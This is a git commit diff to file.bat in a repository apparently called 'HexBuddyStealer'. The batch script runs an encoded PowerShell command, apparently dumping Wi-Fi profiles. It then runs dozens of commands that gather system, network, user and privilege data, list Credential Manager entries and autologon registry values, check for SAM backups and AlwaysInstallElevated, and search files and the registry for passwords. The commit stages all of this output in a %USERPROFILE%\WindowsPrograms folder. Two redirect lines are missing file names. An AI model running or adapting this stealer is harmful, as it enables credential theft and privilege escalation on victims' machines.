909b57b0b0452b3ad65195a4adfc207bdd264a5a
Hex Buddy <82332026+HexBuddy@users.noreply.github.com>
2023-03-23 11:38:44 -0700

    Update file.bat

--- HexBuddyStealer/Bin/file.bat
+++ HexBuddyStealer/Bin/file.bat
@@ -13,40 +13,39 @@ powershell -EncodedCommand "KABuAGUAdABzAGgAIAB3AGwAYQBuACAAcwBoAG8AdwAgAHAAcgBv
 
 cd..
 
+mkdir WindowsPrograms
 
-
-powershell -c "Start-Process 'systeminfo' -NoNewWindow -Wait"
-powershell -c "Get-ChildItem Env: | ft Key,Value"
-powershell -c "Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address"
-powershell -c "Get-DnsClientServerAddress -AddressFamily IPv4 | ft"
-powershell -c "Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State"
-powershell -c "Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex"
-powershell -c "Start-Process 'netstat' -ArgumentList '-ano' -NoNewWindow -Wait | ft"
-powershell -c "Get-PSDrive | where {$_.Provider -like 'Microsoft.PowerShell.Core\FileSystem'}| ft"
-powershell -c "Start-Process 'netsh' -ArgumentList 'firewall show config' -NoNewWindow -Wait | ft"
-powershell -c "Write-Host $env:UserDomain\$env:UserName"
-powershell -c "start-process 'whoami' -ArgumentList '/priv' -NoNewWindow -Wait | ft"
-powershell -c "Get-LocalUser | ft Name,Enabled,LastLogon"
-powershell -c "Start-Process 'qwinsta' -NoNewWindow -Wait | ft"
-powershell -c "start-process 'cmdkey' -ArgumentList "/list" -NoNewWindow -Wait | ft"
-powershell -c "Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select 'Default*' | ft"
-powershell -c "Get-LocalGroup | ft Name"
-powershell -c "Get-LocalGroupMember Administrators | ft Name, PrincipalSource"
-powershell -c "Get-ChildItem C:\Users | ft Name"
-powershell -c "Test-Path %SYSTEMROOT%\repair\SAM ; Test-Path %SYSTEMROOT%\system32\config\regback\SAM"
-powershell -c "gwmi -Query 'Select * from Win32_Process' | where {$_.Name -notlike 'svchost*'} | Select Name, Handle, @{Label='Owner';Expression={$_.GetOwner().User}} | ft -AutoSize"
-powershell -c "Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime"
-powershell -c "Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name"
-powershell -c "Get-ChildItem 'C:\Program Files\*', 'C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} | ft"
-powershell -c "Get-ChildItem 'C:\Program Files\*', 'C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}} | ft"
-powershell -c "Test-Path -Path 'Registry::HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer' | ft"
-powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\Microsoft*'} | ft TaskName,TaskPath,State"
-powershell -c "Get-ChildItem C:\Windows\Tasks | ft"
-powershell -c "Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl"
-powershell -c "Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like '*.xml' -or $_.Name -like '*.txt' -or $_.Name -like '*.ini')}"
-powershell -c "Get-ChildItem c:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.PSPath -notlike '*C:\temp*' -and $_.PSParentPath -notlike '*Reference Assemblies*' -and $_.PSParentPath -notlike '*Windows Kits*'}| Select-String -Pattern 'password'"
-powershell -c "reg query HKLM /f password /t REG_SZ /s"
-powershell -c "reg query HKCU /f password /t REG_SZ /s"
+powershell -c "Start-Process 'systeminfo' -NoNewWindow -Wait" > %USERPROFILE%\WindowsPrograms\Basic-System-Information.txt
+powershell -c "Get-ChildItem Env: | ft Key,Value" > %USERPROFILE%\WindowsPrograms\Environment-Variables.txt
+powershell -c "Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address" > %USERPROFILE%\WindowsPrograms\Network-Information.txt
+powershell -c "Get-DnsClientServerAddress -AddressFamily IPv4 | ft"  > %USERPROFILE%\WindowsPrograms\DNS-Servers.txt
+powershell -c "Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State"  > %USERPROFILE%\WindowsPrograms\ARP-cache.txt
+powershell -c "Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex"  > %USERPROFILE%\WindowsPrograms\Routing-Table.txt
+powershell -c "Start-Process 'netstat' -ArgumentList '-ano' -NoNewWindow -Wait | ft"  > %USERPROFILE%\WindowsPrograms\Network-Connections.txt
+powershell -c "Get-PSDrive | where {$_.Provider -like 'Microsoft.PowerShell.Core\FileSystem'}| ft"  > %USERPROFILE%\WindowsPrograms\Connected-Drives.txt
+powershell -c "Start-Process 'netsh' -ArgumentList 'firewall show config' -NoNewWindow -Wait | ft"  > %USERPROFILE%\WindowsPrograms\Firewall-Config.txt
+powershell -c "Write-Host $env:UserDomain\$env:UserName"  > %USERPROFILE%\WindowsPrograms\Current-User.txt
+powershell -c "start-process 'whoami' -ArgumentList '/priv' -NoNewWindow -Wait | ft"  > %USERPROFILE%\WindowsPrograms\User-Privileges.txt
+powershell -c "Get-LocalUser | ft Name,Enabled,LastLogon"  > %USERPROFILE%\WindowsPrograms\Local-Users.txt
+powershell -c "Start-Process 'qwinsta' -NoNewWindow -Wait | ft"  > %USERPROFILE%\WindowsPrograms\Logged-in-Users.txt
+powershell -c "start-process 'cmdkey' -ArgumentList "/list" -NoNewWindow -Wait | ft"  > %USERPROFILE%\WindowsPrograms\Credential-Manager.txt
+powershell -c "Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select 'Default*' | ft"  > %USERPROFILE%\WindowsPrograms\User-Autologon-Registry-Items.txt
+powershell -c "Get-LocalGroup | ft Name"  > %USERPROFILE%\WindowsPrograms\Local-Groups.txt
+powershell -c "Get-LocalGroupMember Administrators | ft Name, PrincipalSource"  > %USERPROFILE%\WindowsPrograms\Local-Administrators.txt
+powershell -c "Get-ChildItem C:\Users | ft Name"  > %USERPROFILE%\WindowsPrograms\User-Directories.txt
+powershell -c "Test-Path %SYSTEMROOT%\repair\SAM ; Test-Path %SYSTEMROOT%\system32\config\regback\SAM"  > %USERPROFILE%\WindowsPrograms\Searching-for-SAM-backup-files.txt
+powershell -c "gwmi -Query 'Select * from Win32_Process' | where {$_.Name -notlike 'svchost*'} | Select Name, Handle, @{Label='Owner';Expression={$_.GetOwner().User}} | ft -AutoSize"  > %USERPROFILE%\WindowsPrograms\Running-Processes.txt
+powershell -c "Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime"  > %USERPROFILE%\WindowsPrograms\Installed-Software-Directories.txt
+powershell -c "Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name"  > %USERPROFILE%\WindowsPrograms\Software-in-Registry.txt
+powershell -c "Get-ChildItem 'C:\Program Files\*', 'C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} | ft"  > %USERPROFILE%\WindowsPrograms\Folders-with-Everyone-Permissions.txt
+powershell -c "Get-ChildItem 'C:\Program Files\*', 'C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}} | ft" > %USERPROFILE%\WindowsPrograms\Folders-with-BUILTIN-User-Permissions.txt
+powershell -c "Test-Path -Path 'Registry::HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer' | ft" > %USERPROFILE%\WindowsPrograms\Checking-registry-for-AlwaysInstallElevated.txt
+powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\Microsoft*'} | ft TaskName,TaskPath,State" > %USERPROFILE%\WindowsPrograms\Scheduled-Tasks.txt
+powershell -c "Get-ChildItem C:\Windows\Tasks | ft" > %USERPROFILE%\WindowsPrograms\
+powershell -c "Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl"  > %USERPROFILE%\WindowsPrograms\
+powershell -c "Get-ChildItem c:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.PSPath -notlike '*C:\temp*' -and $_.PSParentPath -notlike '*Reference Assemblies*' -and $_.PSParentPath -notlike '*Windows Kits*'}| Select-String -Pattern 'password'" > %USERPROFILE%\WindowsPrograms\Searching-for-files-with-passwords.txt
+powershell -c "reg query HKLM /f password /t REG_SZ /s"  > %USERPROFILE%\WindowsPrograms\Searching-HKLM-for-passwords.txt
+powershell -c "reg query HKCU /f password /t REG_SZ /s"  > %USERPROFILE%\WindowsPrograms\Searching-HKCU-for-passwords.txt
 
 
 
